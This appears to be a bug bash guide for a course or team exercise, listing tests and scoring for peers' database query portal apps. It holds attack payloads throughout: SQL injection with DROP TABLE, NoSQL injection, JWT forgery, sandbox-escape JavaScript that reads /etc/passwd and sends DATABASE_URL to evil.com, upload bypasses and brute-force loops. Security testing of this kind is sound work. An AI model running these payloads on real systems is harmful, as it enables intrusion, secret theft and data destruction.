# Bug Bash Guide: Database Query Execution Portal

A comprehensive checklist to find bugs and vulnerabilities in your peers' implementations, organized from **P0 (Critical)** to lower priority issues.

---

## 🔴 P0 - Critical Security Vulnerabilities (+15 points)

### 1. SQL Injection

```bash
# Test in query submission field
' OR '1'='1' --
'; DROP TABLE users; --
1; DELETE FROM query_requests; --
' UNION SELECT password FROM users --
admin'--
```

**Where to test:**
- Query textarea in submission form
- Any search/filter inputs
- URL parameters like `?id=1' OR 1=1`

**What to look for:**
- Raw SQL errors exposed to user
- Data from other tables returned
- 500 errors with stack traces

---

### 2. NoSQL Injection (MongoDB)

```javascript
// Try these in MongoDB query field
{"$where": "sleep(5000)"}
{"$gt": ""}
{"username": {"$ne": null}}
{"$or": [{"a": 1}, {"b": 2}]}
{"password": {"$regex": ".*"}}
```

**Dangerous operators to test:**
- `$where` - JavaScript execution
- `$function` - Custom functions
- `$accumulator` - Code execution
- `mapReduce` - Map/reduce functions

---

### 3. Authentication Bypass

```bash
# Test JWT manipulation
# 1. Capture a valid token
# 2. Modify payload in jwt.io
# 3. Try with:
- Empty signature: eyJ...payload...
- None algorithm: {"alg":"none"}
- Changed role: "role": "admin"

# Test without token
curl http://target/api/requests
curl http://target/api/auth/me

# Test with expired token
# Test with token from different user
```

**Checklist:**
- [ ] Can access protected routes without token?
- [ ] Can modify JWT payload and still be authenticated?
- [ ] Are expired tokens rejected?
- [ ] Is "alg: none" attack prevented?

---

### 4. Authorization/RBAC Bypass

```bash
# As Developer, try to:
curl -X POST http://target/api/requests/123/approve \
  -H "Authorization: Bearer $DEV_TOKEN"

curl -X GET http://target/api/requests \
  -H "Authorization: Bearer $DEV_TOKEN"

# As Manager of POD-1, try to approve POD-2 request:
curl -X POST http://target/api/requests/{pod2-request-id}/approve \
  -H "Authorization: Bearer $POD1_MANAGER_TOKEN"

# Try to access another user's submission:
curl http://target/api/requests/{other-user-request-id} \
  -H "Authorization: Bearer $YOUR_TOKEN"
```

**Checklist:**
- [ ] Developer can approve/reject requests?
- [ ] Manager can approve requests outside their POD?
- [ ] User can view another user's request details?
- [ ] Role can be changed via API?

---

### 5. Script Execution Sandbox Escape

```javascript
// Upload these as .js scripts to test sandbox

// Test 1: Command execution
const { exec } = require('child_process');
exec('cat /etc/passwd', (err, stdout) => console.log(stdout));

// Test 2: File system access
const fs = require('fs');
console.log(fs.readFileSync('/etc/passwd', 'utf8'));

// Test 3: Network access
const http = require('http');
http.get('http://evil.com/exfil?data=' + process.env.DATABASE_URL);

// Test 4: Environment variable leakage
console.log(JSON.stringify(process.env));

// Test 5: Process manipulation
process.exit(1);

// Test 6: Eval/Function
eval('console.log("pwned")');
new Function('return process.env')();
```

---

## 🟠 P1 - Major Bugs (+10 points)

### 6. IDOR (Insecure Direct Object Reference)

```bash
# Enumerate request IDs
for i in {1..1000}; do
  curl -s http://target/api/requests/$i \
    -H "Authorization: Bearer $TOKEN" | grep -q "success" && echo "Found: $i"
done

# Try UUID manipulation if using UUIDs
# Try sequential IDs: 1, 2, 3...
# Try negative IDs: -1, 0
```

---

### 7. Broken Workflow Logic

**Test scenarios:**
- [ ] Approve already approved request
- [ ] Approve already rejected request
- [ ] Reject already executed request
- [ ] Submit request with non-existent database
- [ ] Submit request with non-existent POD
- [ ] Submit request with non-existent instance

```bash
# Approve twice
curl -X POST http://target/api/requests/123/approve -H "Auth: Bearer $TOKEN"
curl -X POST http://target/api/requests/123/approve -H "Auth: Bearer $TOKEN"

# Approve then reject same request
curl -X POST http://target/api/requests/123/approve -H "Auth: Bearer $TOKEN"
curl -X POST http://target/api/requests/123/reject -H "Auth: Bearer $TOKEN"
```

---

### 8. File Upload Vulnerabilities

```bash
# Test 1: Upload non-JS file
curl -X POST http://target/api/requests \
  -F "script=@malicious.php" \
  -H "Authorization: Bearer $TOKEN"

# Test 2: Double extension
curl -F "script=@evil.js.php"

# Test 3: Null byte
curl -F "script=@evil.php%00.js"

# Test 4: Large file (DoS)
dd if=/dev/zero of=huge.js bs=1M count=100
curl -F "script=@huge.js"

# Test 5: Path traversal in filename
curl -F "script=@script.js;filename=../../../etc/passwd.js"
```

---

### 9. Rate Limiting Bypass

```bash
# Test login brute force
for i in {1..200}; do
  curl -X POST http://target/api/auth/login \
    -d '{"email":"test@test.com","password":"wrong'$i'"}' &
done

# Test from different IPs (if behind proxy)
curl -X POST http://target/api/auth/login \
  -H "X-Forwarded-For: 1.2.3.$i"

# Test if rate limit is per-endpoint or global
```

---

### 10. Missing Input Validation

Test with:
- Empty strings: `""`
- Very long strings: 10,000+ characters
- Special characters: `<>'";&|`
- Unicode: `\u0000`, null bytes
- Negative numbers for pagination: `?page=-1&limit=-100`
- SQL keywords in all fields

```bash
# Oversized inputs
curl -X POST http://target/api/requests \
  -d '{"query": "'$(python -c "print('A'*100000)"))'"}'

# Negative pagination
curl "http://target/api/requests?page=-1&limit=99999"

# Special characters in comments
curl -d '{"comments": "<script>alert(1)</script>"}'
```

---

## 🟡 P2 - Minor Bugs (+5 points)

### 11. Information Disclosure

**Check for:**
- [ ] Stack traces in error responses
- [ ] Database errors exposed
- [ ] Version numbers in headers (`X-Powered-By`)
- [ ] Sensitive data in logs
- [ ] Debug endpoints enabled
- [ ] API documentation exposed

```bash
# Force errors
curl http://target/api/requests/undefined
curl http://target/api/requests/'
curl -X POST http://target/api/auth/login -d '{invalid json'

# Check headers
curl -I http://target/api/health

# Common debug endpoints
curl http://target/debug
curl http://target/api/debug
curl http://target/metrics
curl http://target/.env
curl http://target/config
```

---

### 12. Missing Security Headers

```bash
curl -I http://target | grep -E "(X-Frame|X-Content-Type|X-XSS|Content-Security|Strict-Transport)"
```

**Expected headers:**
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 1; mode=block`
- `Content-Security-Policy: ...`
- `Strict-Transport-Security: ...`

---

### 13. CORS Misconfiguration

```bash
# Test with evil origin
curl -I http://target/api/auth/login \
  -H "Origin: https://evil.com"

# Check if Access-Control-Allow-Origin is *
# Check if credentials are allowed with wildcard
```

---

### 14. Pagination/Filter Bugs

```bash
# Edge cases
curl "http://target/api/requests?page=0"
curl "http://target/api/requests?page=999999"
curl "http://target/api/requests?limit=0"
curl "http://target/api/requests?limit=1000000"

# SQL injection in filters
curl "http://target/api/requests?status=pending' OR '1'='1"
curl "http://target/api/requests?podId='; DROP TABLE--"
```

---

### 15. UI/UX Bugs

- [ ] Form doesn't clear after submission
- [ ] No loading states during API calls
- [ ] No error messages on failure
- [ ] Browser back button breaks flow
- [ ] Session doesn't expire on logout
- [ ] Sensitive data visible in browser history
- [ ] Auto-complete enabled on password fields
- [ ] Query/script content truncated without notice

---

## 🧪 Automated Testing Tools

```bash
# SQLMap for SQL injection
sqlmap -u "http://target/api/requests?id=1" --cookie="token=..."

# Nikto for web vulnerabilities
nikto -h http://target

# OWASP ZAP (proxy mode)
# Run through all API calls with proxy

# Burp Suite
# Capture requests, modify, replay
```

---

## 📋 Quick Checklist

### Authentication
- [ ] Login without credentials
- [ ] Login with wrong password (check for user enumeration)
- [ ] JWT manipulation
- [ ] Expired token handling
- [ ] Multiple simultaneous sessions

### Authorization
- [ ] Developer accessing manager routes
- [ ] Manager accessing other POD's requests
- [ ] User accessing other user's data
- [ ] Role escalation attempts

### Input Validation
- [ ] SQL injection in all text fields
- [ ] NoSQL injection in MongoDB queries
- [ ] XSS in comments/query fields
- [ ] Command injection in scripts
- [ ] File upload bypass

### Business Logic
- [ ] Double approve/reject
- [ ] State transition violations
- [ ] Concurrent modification handling
- [ ] Negative/zero values where positive expected

### Error Handling
- [ ] Stack traces exposed
- [ ] Database errors exposed
- [ ] Meaningful error messages for all cases

---

## 🎯 Bug Report Template

```markdown
**Title:** [Brief description]

**Severity:** Critical / Major / Minor

**Steps to Reproduce:**
1. 
2. 
3. 

**Expected Result:**

**Actual Result:**

**Evidence:** [Screenshot/request/response]

**Impact:** [What could an attacker do?]
```

---

## 📊 Scoring Reminder

| Bug Type | Points for Finding | Points Deducted if in YOUR app |
|----------|-------------------|-------------------------------|
| Critical | +15 | -30 |
| Major | +10 | -20 |
| Minor | +5 | -10 |

**Max Bug Bash Score: 100 points**

Good luck hunting! 🎯
